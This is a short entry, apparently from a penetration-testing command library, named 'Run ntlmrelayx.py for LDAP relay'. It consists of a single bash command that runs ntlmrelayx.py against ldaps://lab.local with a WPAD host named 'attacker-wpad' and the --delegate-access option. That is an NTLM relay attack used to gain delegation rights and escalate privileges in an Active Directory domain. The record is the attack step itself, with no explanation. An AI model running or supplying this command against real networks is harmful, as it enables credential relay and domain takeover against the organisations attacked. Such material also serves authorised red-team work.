---
id: d0206a4c-645f-4a4e-9ac3-db2697946609
name: Run ntlmrelayx.py for LDAP relay
type: command
executor: bash
data: ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
output: null
created_at: '2023-04-06T03:56:01.852156+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Run ntlmrelayx.py for LDAP relay

```bash
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
```
